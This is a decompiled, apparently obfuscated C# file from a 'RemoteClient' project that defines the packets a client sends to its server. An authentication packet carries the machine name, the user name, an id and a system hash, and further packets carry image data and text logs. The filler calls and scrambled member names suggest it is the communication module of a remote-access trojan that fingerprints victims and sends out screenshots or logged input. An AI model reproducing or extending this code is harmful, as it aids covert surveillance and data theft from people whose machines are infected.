using System;
using System.Collections.Generic;
using System.Text;
using RemoteClient.Mappers;
using RemoteClient.Polices;
using RemoteClient.Tasks;

namespace RemoteClient.Pakcets.Client
{
	// Token: 0x0200003A RID: 58
	public static class Packets
	{
		// Token: 0x060000E7 RID: 231 RVA: 0x00002730 File Offset: 0x00000930
		// Note: this type is marked as 'beforefieldinit'.
		static Packets()
		{
			InvocationProcessPolicy.CompareError();
			Packets.m_Attr = Encoding.ASCII.GetBytes("<EOM>");
			Packets.m_Interceptor = Encoding.ASCII.GetBytes("<EOF>");
		}

		// Token: 0x040000AA RID: 170
		private static byte[] m_Attr;

		// Token: 0x040000AB RID: 171
		private static byte[] m_Interceptor;

		// Token: 0x0200003B RID: 59
		public interface IPacket
		{
			// Token: 0x060000E8 RID: 232
			void Execute(RemoteClient cl);

			// Token: 0x060000E9 RID: 233
			List<byte> ToList();
		}

		// Token: 0x0200003C RID: 60
		public class Auth : Packets.IPacket
		{
			// Token: 0x060000EA RID: 234 RVA: 0x0000275F File Offset: 0x0000095F
			public void Execute(RemoteClient cl)
			{
				if (cl != null)
				{
					cl.Send(this);
				}
			}

			// Token: 0x060000EB RID: 235 RVA: 0x00006130 File Offset: 0x00004330
			public List<byte> ToList()
			{
				List<byte> list = new List<byte>();
				list.AddRange(this.type);
				list.AddRange(this.algoMapper);
				list.AddRange(this.winName);
				list.AddRange(this.algoMapper);
				list.AddRange(this.uName);
				list.AddRange(this.algoMapper);
				list.AddRange(this.id);
				list.AddRange(this.algoMapper);
				list.AddRange(this.testOS);
				return list;
			}

			// Token: 0x060000EC RID: 236 RVA: 0x000061B4 File Offset: 0x000043B4
			public Auth()
			{
				InvocationProcessPolicy.CompareError();
				this.algoMapper = Encoding.ASCII.GetBytes("<EOM>");
				this.type = new byte[1];
				this.winName = Encoding.ASCII.GetBytes(SchemaMapper.CalculateContext());
				this.testOS = Encoding.ASCII.GetBytes(ProcessListenerTask.ReflectMapper().GetHashCode().ToString());
				this.uName = Encoding.ASCII.GetBytes(Environment.UserName);
				this.id = Program.id;
				base..ctor();
			}

			// Token: 0x040000AC RID: 172
			private byte[] algoMapper;

			// Token: 0x040000AD RID: 173
			public byte[] type;

			// Token: 0x040000AE RID: 174
			public byte[] winName;

			// Token: 0x040000AF RID: 175
			public byte[] testOS;

			// Token: 0x040000B0 RID: 176
			public byte[] uName;

			// Token: 0x040000B1 RID: 177
			public byte[] id;
		}

		// Token: 0x0200003D RID: 61
		public class Img : Packets.IPacket
		{
			// Token: 0x060000ED RID: 237 RVA: 0x0000275F File Offset: 0x0000095F
			public void Execute(RemoteClient cl)
			{
				if (cl != null)
				{
					cl.Send(this);
				}
			}

			// Token: 0x060000EE RID: 238 RVA: 0x00006244 File Offset: 0x00004444
			public List<byte> ToList()
			{
				List<byte> list = new List<byte>();
				list.AddRange(this.type);
				list.AddRange(this.data);
				return list;
			}

			// Token: 0x060000EF RID: 239 RVA: 0x0000276E File Offset: 0x0000096E
			public Img()
			{
				InvocationProcessPolicy.CompareError();
				this.type = new byte[]
				{
					1
				};
				base..ctor();
			}

			// Token: 0x040000B2 RID: 178
			public byte[] type;

			// Token: 0x040000B3 RID: 179
			public byte[] data;
		}

		// Token: 0x0200003E RID: 62
		public class CodecInfo : Packets.IPacket
		{
			// Token: 0x060000F0 RID: 240 RVA: 0x0000278B File Offset: 0x0000098B
			public CodecInfo(byte[] _data)
			{
				InvocationProcessPolicy.CompareError();
				this.type = 1;
				base..ctor();
				this.data = _data;
			}

			// Token: 0x060000F1 RID: 241 RVA: 0x0000275F File Offset: 0x0000095F
			public void Execute(RemoteClient cl)
			{
				if (cl != null)
				{
					cl.Send(this);
				}
			}

			// Token: 0x060000F2 RID: 242 RVA: 0x00006274 File Offset: 0x00004474
			public List<byte> ToList()
			{
				List<byte> list = new List<byte>();
				list.Add(this.type);
				list.AddRange(Packets.m_Attr);
				list.AddRange(this.data);
				return list;
			}

			// Token: 0x040000B4 RID: 180
			public byte type;

			// Token: 0x040000B5 RID: 181
			public byte[] data;
		}

		// Token: 0x0200003F RID: 63
		public class Log : Packets.IPacket
		{
			// Token: 0x060000F3 RID: 243 RVA: 0x000027A6 File Offset: 0x000009A6
			public Log(string _data)
			{
				InvocationProcessPolicy.CompareError();
				this.type = 2;
				base..ctor();
				this.data = Encoding.ASCII.GetBytes(_data);
			}

			// Token: 0x060000F4 RID: 244 RVA: 0x0000275F File Offset: 0x0000095F
			public void Execute(RemoteClient cl)
			{
				if (cl != null)
				{
					cl.Send(this);
				}
			}

			// Token: 0x060000F5 RID: 245 RVA: 0x000062B0 File Offset: 0x000044B0
			public List<byte> ToList()
			{
				List<byte> list = new List<byte>();
				list.Add(this.type);
				list.AddRange(Packets.m_Attr);
				list.AddRange(this.data);
				return list;
			}

			// Token: 0x040000B6 RID: 182
			public byte type;

			// Token: 0x040000B7 RID: 183
			public byte[] data;
		}
	}
}
